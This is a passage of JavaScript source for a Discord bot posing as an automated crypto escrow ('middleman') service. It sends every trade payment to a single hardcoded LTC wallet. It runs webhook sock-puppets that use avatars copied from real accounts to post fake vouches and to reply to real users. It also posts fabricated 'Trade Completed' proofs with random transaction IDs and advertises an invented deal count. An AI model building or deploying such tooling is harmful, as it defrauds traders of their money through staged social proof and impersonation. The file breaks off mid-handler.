const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');
const axios = require('axios');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1484995433037041734';
const MIDDLEMAN_ROLE_ID = '1485011076923003090';
const LOGS_CHANNEL_ID = '1484995546249953280';
const CHATTER_CHANNEL_ID = '1485705984625348853'; // <-- PUT YOUR CHANNEL ID HERE

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// Store data
const trades = new Map();
const stepStates = new Map();
const userPurchases = new Map();
const roleConfirmations = new Map();
const amountConfirmations = new Map();
const feeConfirmations = new Map();

let liveRates = {
  ltc: 55.83,
  usdt: 1.00,
};

// ========== FAKE USERS FOR CHATTER ==========
const fakeUsers = [
  { name: 'Azy', avatar: 'https://cdn.discordapp.com/avatars/383320525667303424/e50be684e10c242a1fd8cc44e35d58ff.png?size=4096' },
  { name: 'alexx_gng', avatar: 'https://cdn.discordapp.com/avatars/1135999619541774386/fc2fcfce99710fcc8dc4c48f5ca14ff4.png?size=4096' },
  { name: 'wolf145', avatar: 'https://cdn.discordapp.com/avatars/1138417089024106558/db8a82d2cdfec0c4c8c03a8f5487a375.png?size=4096' },
  { name: 'COTZY2123', avatar: 'https://cdn.discordapp.com/avatars/1447662505483829250/fcdd5830d9acc21d45a230fab91a8aea.png?size=4096' },
  { name: 'Biggy1112', avatar: 'https://cdn.discordapp.com/avatars/1457751269291851982/450edcb1026634addd5c0a5b42e7ac41.png?size=4096' },
  { name: 'LEON_1212', avatar: 'https://cdn.discordapp.com/avatars/1453986984941977692/fcdf6d0192650886ae1b0037d4c744c0.png?size=4096' },
  { name: 'Valorabd', avatar: 'https://cdn.discordapp.com/avatars/1482041529299112080/4dfba190ca13d64c4c03dea3bbdfee39.png?size=4096' },
  { name: 'k1ssmyomega9999', avatar: 'https://cdn.discordapp.com/avatars/1123715011685130320/c794aca2a41454359cae584853976a6c.png?size=4096' },
  { name: 'kafka', avatar: 'https://cdn.discordapp.com/avatars/1423641549056512192/64af447e2dc13bb0e50b8fbf2d64b1ce.png?size=4096' },
  { name: 'Annie', avatar: 'https://cdn.discordapp.com/avatars/839335127250239489/a_672f1d4d5d2d2c16bc2f003526a1d89b.gif?size=4096' }
];

// ========== RANDOM PROOF GENERATOR NAMES ==========
const randomNames = [
  'Tomar753', 'Alex_gng', 'Johndoe', 'Sarah_urlove', 'Mike999', 'Emmaammee', 
  'Davidderpe', 'Lisalepa', 'Kevin123123', 'Sophia_foruu', 'James12156', 
  'Olivia1361', 'Liam', 'Mia-Sophie', 'Noahplayz', 'Isabellas_saaw'
];

// ========== ADVANCED MESSAGE SYSTEM (NO REPEATS) ==========
let messageHistory = [];
let replyHistory = [];

function getRandomMessage() {
  const messages = [
    // W/L Debates (15)
    "yo chat W or L?",
    "is this a W?",
    "L or W?",
    "W?",
    "that's a W or L",
    "rate this: W or L",
    "W or L chat?",
    "tell me this is a W",
    "massive W or massive L?",
    "W? 👀",
    "L? 💀",
    "W or L? i need opinions",
    "be honest W or L",
    "quick W or L check",
    "W or L guys?",
    
    // Admin Abuse (12)
    "when is admin abuse today?",
    "admin abuse time?",
    "who's getting abused today",
    "abuse when 😭",
    "admin abuse?",
    "time for abuse?",
    "abuse session at what time",
    "yall doing abuse today?",
    "abuse?",
    "when abuse start?",
    "admin abuse when?",
    "abuse???",
    
    // Trust Checking (14)
    "is this guy trusted?",
    "someone vouch?",
    "is this legit?",
    "trusted?",
    "can anyone vouch for this?",
    "legit or scam?",
    "vouch?",
    "trust check",
    "is this legit fr?",
    "trusted or nah?",
    "anyone know if this is trusted?",
    "need a vouch",
    "legit?",
    "trust?",
    
    // Brainrot (20)
    "skibidi toilet rizz 💀",
    "gyattt",
    "fr fr no cap",
    "on god",
    "blud thinks he's him",
    "bro is not cooking",
    "what the sigma",
    "sheesh 🔥",
    "bussin fr",
    "no shot 💀",
    "bet",
    "cooked 💀",
    "rizz",
    "mewing",
    "sigma male",
    "lmaoo",
    "💀💀💀",
    "nah fr",
    "cap",
    "no cap",
    
    // Random Beefs (15)
    "bro thinks he's the main character",
    "why is everyone fighting today",
    "beef is crazy",
    "who beefing rn?",
    "yall need to chill",
    "another beef?",
    "this server wilding",
    "beef or nah?",
    "beef in chat",
    "someone's mad",
    "who's beefing?",
    "beef everywhere",
    "yall need to stop",
    "beef crazy rn",
    "chill out 💀",
    
    // Trading/Crypto (18)
    "just made 50 bucks 🔥",
    "anyone buying LTC?",
    "price looking good rn",
    "who's trading today?",
    "market is crazy",
    "just completed a trade, fast af",
    "bot is goated fr",
    "escrow system too smooth",
    "LTC to $100?",
    "chart looking bullish",
    "good time to buy?",
    "who's selling?",
    "price action wild",
    "ez money",
    "another trade done",
    "middleman legit",
    "fastest trade ever",
    "bot is clutch",
    
    // General Chat (20)
    "what yall doing today?",
    "who's awake rn?",
    "anyone else trading?",
    "good morning 🗿",
    "night shift gang where you at",
    "active rn?",
    "server dead?",
    "wassup",
    "yo",
    "anyone here?",
    "chat alive?",
    "good evening",
    "what's good",
    "how's everyone doing",
    "busy day today",
    "anyone down to trade",
    "bored rn",
    "wyd",
    "hmu if trading",
    "let's get this bread",
    
    // Reactions (16)
    "LMAOOO",
    "💀",
    "😭",
    "nah fr",
    "real",
    "fax",
    "fr",
    "💀💀💀",
    "😂",
    "💯",
    "🔥",
    "🗿",
    "😭😭😭",
    "LOL",
    "fr fr",
    "on god",
    
    // Middleman Specific (20)
    "best middleman bot fr",
    "escrow saved me from scam",
    "this bot is too smooth",
    "fastest release ever",
    "middleman goated",
    "trust this bot 100%",
    "never had issues with escrow",
    "bot is legit",
    "just used the bot, 10/10",
    "middleman system is 🔥",
    "bot never fails",
    "trusted escrow",
    "quick trade thanks bot",
    "safest way to trade",
    "no scams with this bot",
    "bot doing gods work",
    "middleman clutch",
    "escrow is the way",
    "best decision to use this",
    "bot is op"
  ];
  
  // Filter out recent messages (last 15)
  const available = messages.filter(m => !messageHistory.includes(m));
  let selected;
  
  if (available.length === 0) {
    selected = messages[Math.floor(Math.random() * messages.length)];
    messageHistory = [];
  } else {
    selected = available[Math.floor(Math.random() * available.length)];
  }
  
  messageHistory.push(selected);
  if (messageHistory.length > 15) messageHistory.shift();
  
  return selected;
}

// ========== INTELLIGENT REPLY SYSTEM ==========
function getReplyToMessage(messageContent, userMention) {
  const lower = messageContent.toLowerCase();
  let reply = '';
  
  // Crypto/Trading
  if (lower.includes('price') || lower.includes('ltc') || lower.includes('chart') || lower.includes('buy') || lower.includes('sell') || lower.includes('trade')) {
    const replies = [
      `@${userMention} looking good rn ngl`,
      `@${userMention} charts are crazy today 🔥`,
      `@${userMention} LTC to the moon fr`,
      `@${userMention} just bought more 💎`,
      `@${userMention} hold or sell?`,
      `@${userMention} market is wild rn`,
      `@${userMention} ez profit 🔥`,
      `@${userMention} trust the process`,
      `@${userMention} lfg 🚀`,
      `@${userMention} bot makes it easy`,
      `@${userMention} did a trade earlier, smooth`,
      `@${userMention} price action crazy`,
      `@${userMention} good time to buy?`,
      `@${userMention} holding or selling?`,
      `@${userMention} LTC looking bullish`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // W/L
  else if (lower.includes('w') || lower.includes('l') || lower.includes('ratio')) {
    const replies = [
      `@${userMention} massive W 🔥`,
      `@${userMention} L for sure 💀`,
      `@${userMention} W no cap`,
      `@${userMention} that's a fat L`,
      `@${userMention} W fr fr`,
      `@${userMention} L 💀💀💀`,
      `@${userMention} W all day`,
      `@${userMention} L ngl`,
      `@${userMention} W 🔥🔥`,
      `@${userMention} L ratio`,
      `@${userMention} W easy`,
      `@${userMention} big L`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Admin Abuse
  else if (lower.includes('admin') || lower.includes('abuse')) {
    const replies = [
      `@${userMention} when tho 😭`,
      `@${userMention} fr when`,
      `@${userMention} someone lmk`,
      `@${userMention} need that abuse rn`,
      `@${userMention} abuse time best time`,
      `@${userMention} waiting for it`,
      `@${userMention} today?`,
      `@${userMention} let's goooo`,
      `@${userMention} abuse goes crazy`,
      `@${userMention} 💀💀💀`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Trust/Vouch
  else if (lower.includes('trust') || lower.includes('legit') || lower.includes('scam') || lower.includes('vouch')) {
    const replies = [
      `@${userMention} yeah he's trusted`,
      `@${userMention} can vouch`,
      `@${userMention} legit fr`,
      `@${userMention} done trades with him, legit`,
      `@${userMention} scammer?`,
      `@${userMention} idk tbh`,
      `@${userMention} he's good`,
      `@${userMention} vouch 🔥`,
      `@${userMention} not sure`,
      `@${userMention} 100% trusted`,
      `@${userMention} use the bot, it's safe`,
      `@${userMention} escrow system legit`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Greetings
  else if (lower.includes('hi') || lower.includes('hello') || lower.includes('hey') || lower.includes('yo') || lower.includes('wassup')) {
    const replies = [
      `@${userMention} hey 🔥`,
      `@${userMention} wassup`,
      `@${userMention} yo`,
      `@${userMention} sup`,
      `@${userMention} hello`,
      `@${userMention} heyy`,
      `@${userMention} what's good`,
      `@${userMention} welcome`,
      `@${userMention} how's it going`,
      `@${userMention} 🤙`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Brainrot/Slang
  else if (lower.includes('skibidi') || lower.includes('gyat') || lower.includes('rizz') || lower.includes('mewing') || lower.includes('sigma')) {
    const replies = [
      `@${userMention} 💀💀💀`,
      `@${userMention} nah you tweaking`,
      `@${userMention} fr fr`,
      `@${userMention} on god`,
      `@${userMention} no cap`,
      `@${userMention} blud thinks he's him`,
      `@${userMention} 💀`,
      `@${userMention} 😭😭😭`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Beef/Drama
  else if (lower.includes('beef') || lower.includes('fight') || lower.includes('drama')) {
    const replies = [
      `@${userMention} they wilding fr`,
      `@${userMention} beef crazy 💀`,
      `@${userMention} let them cook`,
      `@${userMention} another beef?`,
      `@${userMention} yall need to chill`,
      `@${userMention} who's fighting?`,
      `@${userMention} drama again?`,
      `@${userMention} 💀💀💀`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Bot/Trade related
  else if (lower.includes('bot') || lower.includes('middleman') || lower.includes('escrow')) {
    const replies = [
      `@${userMention} best bot fr`,
      `@${userMention} escrow system goated`,
      `@${userMention} used it today, smooth`,
      `@${userMention} bot is legit`,
      `@${userMention} 10/10 recommend`,
      `@${userMention} never had issues`,
      `@${userMention} fast and secure`,
      `@${userMention} middleman clutch`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Questions
  else if (lower.includes('?')) {
    const replies = [
      `@${userMention} idk tbh`,
      `@${userMention} good question`,
      `@${userMention} fr tho`,
      `@${userMention} same question`,
      `@${userMention} lmk when you find out`,
      `@${userMention} 🤔`,
      `@${userMention} no idea`,
      `@${userMention} someone answer`
    ];
    reply = replies[Math.floor(Math.random() * replies.length)];
  }
  // Default random reaction
  else {
    const defaultReplies = [
      `@${userMention} fr`,
      `@${userMention} real`,
      `@${userMention} fax`,
      `@${userMention} 💀`,
      `@${userMention} 🔥`,
      `@${userMention} fr fr`,
      `@${userMention} on god`,
      `@${userMention} no cap`,
      `@${userMention} W`,
      `@${userMention} L`,
      `@${userMention} 💯`
    ];
    reply = defaultReplies[Math.floor(Math.random() * defaultReplies.length)];
  }
  
  // Ensure no repeat replies
  if (replyHistory.includes(reply)) {
    const fallback = [`@${userMention} fr`, `@${userMention} real`, `@${userMention} W`];
    reply = fallback[Math.floor(Math.random() * fallback.length)];
  }
  
  replyHistory.push(reply);
  if (replyHistory.length > 20) replyHistory.shift();
  
  return reply;
}

function isFakeUser(username) {
  return fakeUsers.some(fake => fake.name.toLowerCase() === username.toLowerCase());
}

// ========== RANDOM PROOF GENERATOR ==========
function generateRandomProof() {
  const usdAmount = (Math.random() * 495 + 5).toFixed(2);
  const ltcAmount = (usdAmount / liveRates.ltc).toFixed(8);
  
  const isSenderAnonymous = Math.random() < 0.6;
  const isReceiverAnonymous = Math.random() < 0.6;
  
  const sender = isSenderAnonymous ? 'Anonymous' : randomNames[Math.floor(Math.random() * randomNames.length)];
  const receiver = isReceiverAnonymous ? 'Anonymous' : randomNames[Math.floor(Math.random() * randomNames.length)];
  
  const chars = '0123456789abcdef';
  let txId = '';
  for (let i = 0; i < 64; i++) txId += chars.charAt(Math.floor(Math.random() * chars.length));
  const shortTxId = txId.substring(0, 12) + '...' + txId.substring(52, 64);
  
  const msgVariations = [
    `${ltcAmount} LTC ($${usdAmount} USD)`,
    `**${ltcAmount}** LTC | **$${usdAmount}** USD`,
    `${ltcAmount} LTC → $${usdAmount}`,
    `💰 ${ltcAmount} LTC ($${usdAmount})`,
    `✅ ${ltcAmount} LTC · $${usdAmount}`
  ];
  
  const embed = new EmbedBuilder()
    .setTitle('✅ Trade Completed')
    .setColor(0x00ff00)
    .setDescription(msgVariations[Math.floor(Math.random() * msgVariations.length)])
    .addFields(
      { name: 'Sender', value: sender, inline: true },
      { name: 'Receiver', value: receiver, inline: true },
      { name: 'Transaction ID', value: shortTxId, inline: true }
    )
    .setTimestamp();
  
  return embed;
}

// ========== FETCH LIVE RATES ==========
async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) {
      liveRates.ltc = parseFloat(response.data.price);
      console.log(`📊 LTC Price: $${liveRates.ltc.toFixed(2)}`);
    }
  } catch (error) {}
}

setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function generateLTCAddress() {
  const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let address = Math.random() > 0.5 ? 'L' : 'M';
  for (let i = 0; i < 33; i++) address += chars.charAt(Math.floor(Math.random() * chars.length));
  return address;
}

function generateTransactionId() {
  const chars = '0123456789abcdef';
  let id = '';
  for (let i = 0; i < 64; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
  return id;
}

// ========== FIND USER ==========
async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  
  try {
    await guild.members.fetch();
  } catch(e) {}
  
  if (input.match(/^\d+$/)) {
    try {
      const user = await client.users.fetch(input);
      return { id: user.id, name: user.username, found: true };
    } catch(e) {}
  }
  
  let member = guild.members.cache.find(m => 
    m.user.username.toLowerCase() === input.toLowerCase() ||
    m.displayName.toLowerCase() === input.toLowerCase()
  );
  if (member) return { id: member.id, name: member.user.username, found: true };
  
  member = guild.members.cache.find(m => 
    m.user.username.toLowerCase().includes(input.toLowerCase())
  );
  if (member) return { id: member.id, name: member.user.username, found: true };
  
  return { id: null, name: input, found: false };
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  const walletAddress = "Lei7Rwf1AvJg6sqhHjbKvkirzXqa6ZSLtET";
  
  let totalUSD = trade.amountUSD;
  if (trade.feePayer === trade.senderId) totalUSD = trade.amountUSD + trade.feeUSD;
  else if (trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
  else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  
  const embed = new EmbedBuilder()
    .setTitle('💸 Payment Information')
    .setColor(0xff9900)
    .setDescription(`<@${trade.senderId}> Send the ${trade.crypto.toUpperCase()} to the following address.`)
    .addFields(
      { name: 'USD Amount', value: `$${trade.amountUSD.toFixed(2)}`, inline: true },
      { name: 'LTC Amount', value: `${trade.amountCrypto}`, inline: true },
      { name: 'Payment Address', value: `\`${walletAddress}\``, inline: false },
      { name: 'Current LTC Price', value: `$${rate.toFixed(2)}`, inline: true }
    )
    .setTimestamp();
  
  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('Copy Details').setStyle(ButtonStyle.Secondary)
  );
  
  await channel.send({ embeds: [embed], components: [copyRow] });
  
  const sender = channel.guild.members.cache.get(trade.senderId);
  const middlemanRole = channel.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (sender && middlemanRole && sender.roles.cache.has(MIDDLEMAN_ROLE_ID)) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`dm_confirm_${trade.channelId}`).setLabel('✅ Confirm Payment').setStyle(ButtonStyle.Success)
    );
    
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 Payment Confirmation Required')
      .setColor(0x0099ff)
      .addFields(
        { name: 'Sender', value: `<@${trade.senderId}>`, inline: true },
        { name: 'Receiver', value: `<@${trade.receiverId}>`, inline: true },
        { name: 'Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${trade.amountUSD})`, inline: true }
      );
    
    try {
      await sender.send({ embeds: [dmEmbed], components: [confirmRow] });
    } catch(e) {}
  }
}

// ========== RANDOM CHATTER ==========
async function startRandomChatter() {
  const channel = client.channels.cache.get(CHATTER_CHANNEL_ID);
  if (!channel) {
    console.log(`❌ Chatter channel not found!`);
    return;
  }
  
  console.log(`✅ Random chatter started in ${channel.name}`);
  
  const scheduleNext = () => {
    const minDelay = 30 * 1000;
    const maxDelay = 5 * 60 * 1000;
    const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
    
    setTimeout(async () => {
      try {
        if (Math.random() < 0.6) {
          const fakeUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
          const message = getRandomMessage();
          
          const webhook = await channel.createWebhook({
            name: fakeUser.name,
            avatar: fakeUser.avatar
          });
          
          await webhook.send(message);
          await webhook.delete();
          console.log(`💬 ${fakeUser.name}: "${message}"`);
        }
      } catch (e) {}
      scheduleNext();
    }, randomDelay);
  };
  
  scheduleNext();
}

// ========== REPLY HANDLER (10-60 SECONDS) ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.channel.id !== CHATTER_CHANNEL_ID) return;
  if (isFakeUser(message.author.username)) return;
  if (Math.random() > 0.45) return;
  
  const delay = Math.floor(Math.random() * 50000) + 10000; // 10-60 seconds
  
  setTimeout(async () => {
    try {
      const channel = client.channels.cache.get(CHATTER_CHANNEL_ID);
      if (!channel) return;
      
      const fakeUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
      const reply = getReplyToMessage(message.content, message.author.username);
      
      const webhook = await channel.createWebhook({
        name: fakeUser.name,
        avatar: fakeUser.avatar
      });
      
      await webhook.send(reply);
      await webhook.delete();
      console.log(`💬 ${fakeUser.name} replied to ${message.author.username}: "${reply}"`);
    } catch(e) {}
  }, delay);
});

// ========== RANDOM PROOF GENERATOR LOOP ==========
async function startRandomProofGenerator() {
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (!logsChannel) return;
  
  const scheduleNext = () => {
    const minDelay = 45 * 1000;
    const maxDelay = 8 * 60 * 1000;
    const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
    
    setTimeout(async () => {
      try {
        const proof = generateRandomProof();
        await logsChannel.send({ embeds: [proof] });
        console.log(`📊 Random proof posted`);
      } catch (e) {}
      scheduleNext();
    }, randomDelay);
  };
  
  scheduleNext();
  console.log('✅ Random proof generator started (45s - 8min intervals)');
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`✨ Sparkles Auto Middleman online as ${client.user.tag}`);
  
  client.user.setPresence({
    activities: [{ name: '5,461 deals | sparklesmm.cloud', type: 3 }],
    status: 'online'
  });
  
  await fetchLiveRates();
  
  const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (channel) {
    const messages = await channel.messages.fetch({ limit: 10 });
    const oldPanel = messages.find(m => m.author.id === client.user.id);
    if (oldPanel) await oldPanel.delete();
    
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman')
      .setColor(0xff69b4)
      .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
      .addFields(
        { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
        { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'Sparkles Auto Middleman' })
      .setTimestamp();
    
    await channel.send({ embeds: [panelEmbed], components: [row] });
    console.log('✅ Ticket panel sent');
  }
  
  await startRandomProofGenerator();
  await startRandomChatter();
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman')
      .setColor(0xff69b4)
      .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
      .addFields(
        { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
        { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'Sparkles Auto Middleman' })
      .setTimestamp();
    
    await message.channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ Panel sent!');
  }
});

// ========== PURCHASES COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    const embed = new EmbedBuilder()
      .setTitle('💰 Purchase History')
      .setColor(0x00ff00)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setDescription(`**${message.author.username}** has spent: **$${total.toFixed(2)}**`);
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!hasAdmin) return message.reply('❌ Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('Usage: $addpurchases 150');
    let targetUser = message.author;
    if (message.mentions.users.size > 0) {
      targetUser = message.mentions.users.first();
      amount = parseFloat(args[2]?.replace('$', ''));
    }
    const current = userPurchases.get(targetUser.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(targetUser.id, newTotal);
    await message.reply(`✅ Added $${amount} to ${targetUser.username}. New total: $${newTotal}`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('Create New Trade');
  
  const traderInput = new TextInputBuilder()
    .setCustomId('trader')
    .setLabel("Trader's Username")
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('Type their username (e.g., john123)')
    .setRequired(true);
  
  const givingInput = new TextInputBuilder()
    .setCustomId('giving')
    .setLabel('What are you giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 50 LTC / Game item')
    .setRequired(true);
  
  const receivingInput = new TextInputBuilder()
    .setCustomId('receiving')
    .setLabel('What is trader giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 0.5 BTC / Service')
    .setRequired(true);
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(traderInput),
    new ActionRowBuilder().addComponents(givingInput),
    new ActionRowBuilder().addComponents(receivingInput)
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  
  const tempData = stepStates.get(`temp_${userId}`);
  if (!tempData) {
    await interaction.editReply({ content: '❌ Session expired' });
    return;
  }
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNumber = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `${tempData.crypto}-${interaction.user.username}-${ticketNumber}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true, SendMessages: true, ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: tempData.crypto,
      ticketNumber: ticketNumber,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[tempData.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman Service')
      .setColor(0xff69b4)
      .setDescription(`${interaction.user} ${traderMention}`)
      .addFields(
        { name: 'Instructions', value: 'Please explicitly state the trade details if inaccurate.\nBy using this bot, you agree to our ToS.', inline: false },
        { name: `${interaction.user.username}'s side:`, value: giving, inline: true },
        { name: `${found.name}'s side:`, value: receiving, inline: true }
      )
      .setTimestamp();
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    await channel.send({ content: `✨ **Welcome to your trade ticket!**\n${interaction.user} ${found.found ? `<@${found.id}>` : ''}\n\nPlease select your roles below.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role:**', components: [roleRow] });
    
    stepStates.delete(`temp_${userId}`);
  } catch (error) {
    console.error(error);
    await interaction.editReply({ content: '❌ Error creating ticket!' });
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('🗑️ Deleting ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
